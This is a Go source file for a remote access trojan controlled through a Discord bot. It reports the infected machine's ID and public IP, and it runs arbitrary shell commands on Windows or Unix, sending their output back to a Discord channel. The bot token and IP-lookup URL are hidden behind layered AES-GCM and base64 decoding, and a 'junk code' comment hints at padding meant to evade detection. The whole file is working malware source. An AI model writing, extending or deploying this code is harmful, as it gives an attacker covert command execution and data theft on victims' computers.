package main

import (
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"net/http"
	"log"
	"fmt"
	"crypto/aes"
	"crypto/cipher"
	b64 "encoding/base64"
	"encoding/hex"
	"io/ioutil"
	"syscall"

	"github.com/bwmarrin/discordgo"
	"github.com/denisbrodbeck/machineid"
)

var (
	MACHINE_ID, err = machineid.ID()
	HELP_MENU       = `**Command usage:**
__command__ **[**id/ALL**]** ` + "`arguments`" + `

**Avaiable commands:**
id —» get machine id
getip —» get machine ip
help —» view this list
quit —» quit
system —» run a system command
`
)

func build_message(text string) string {
	return "**From:** `" + MACHINE_ID + "`\n\n" + text
}

// junk code here

func main() {
	tk := d("token_obf", "token_key")
	log.Print("")
	fmt.Println("")
	dg, err := discordgo.New("Bot " + tk)
	if err != nil {
		return
	}
	dg.AddHandler(messageCreate)
	dg.Identify.Intents = discordgo.IntentsGuildMessages
	err = dg.Open()
	if err != nil {
		//
		return
	}
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc
	dg.Close()
}

func commandhandler(s *discordgo.Session, m *discordgo.MessageCreate, cmd string, arguments string) {
	if cmd == "id" {
		s.ChannelMessageSend(m.ChannelID, MACHINE_ID)
	}
	if cmd == "help" {
		s.ChannelMessageSend(m.ChannelID, build_message(HELP_MENU))
	}
	if cmd == "quit" {
		s.ChannelMessageSend(m.ChannelID, build_message("Quitting"))
		os.Exit(0)
	}
	if cmd == "getip" {
		ip := d("getip_obf", "getip_key")
		resp, err := http.Get(ip)
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, build_message("An error occourred while requesting my ip"))
			return
		}
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, build_message("An error occourred while reading response"))
			return
		}
		sb := string(body)
		s.ChannelMessageSend(m.ChannelID, build_message("IP: "+sb))
	}
	if cmd == "system" {
		if runtime.GOOS == "windows" {
			out, err := exec.Command("cmd.exe", "/c", arguments).Output()
			if err != nil {
				s.ChannelMessageSend(m.ChannelID, build_message("An error occourred or there isn't output"))
			} else {
				output := string(out[:])
				if output == "" {
					output = "No output returned"
				}
				s.ChannelMessageSend(m.ChannelID, build_message(output))
			}
		} else {
			out, err := exec.Command("/bin/sh", "-c", arguments).Output()
			if err != nil {
				s.ChannelMessageSend(m.ChannelID, build_message("An error occourred or there isn't output"))
			} else {
				output := string(out[:])
				if output == "" {
					output = "No output returned"
				}
				s.ChannelMessageSend(m.ChannelID, build_message(output))
			}
		}
	}
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	cmd := ""
	id := ""
	if strings.Contains(m.Content, " ") {
		cmd = strings.Split(m.Content, " ")[0]
		id = strings.Split(m.Content, " ")[1]
	}
	arguments := ""
	if strings.Contains(m.Content, "`") {
		arguments = strings.Split(m.Content, "`")[1]
		arguments = strings.Split(arguments, "`")[0]
	}

	if id == MACHINE_ID || id == "ALL" {
		commandhandler(s, m, cmd, arguments)
	}

}

func d(data string, dckey string) string {
	bytes := []byte(dckey)
	key := hex.EncodeToString(bytes)
	decrypted := dd(data, key)
	decrypted = dd(decrypted, key)
	dcrpstring := fmt.Sprintf("%s", decrypted)
	return ddd(dcrpstring)
}

func dd(encryptedString string, keyString string) (decryptedString string) {
	key, _ := hex.DecodeString(keyString)
	enc, _ := hex.DecodeString(encryptedString)
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := aesGCM.NonceSize()
	nonce, ciphertext := enc[:nonceSize], enc[nonceSize:]
	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return fmt.Sprintf("%s", plaintext)
}
func ddd(uEnc string) string {
	uDec, _ := b64.URLEncoding.DecodeString(uEnc)
	sDec, _ := b64.StdEncoding.DecodeString(string(uDec))
	return string(sDec)
}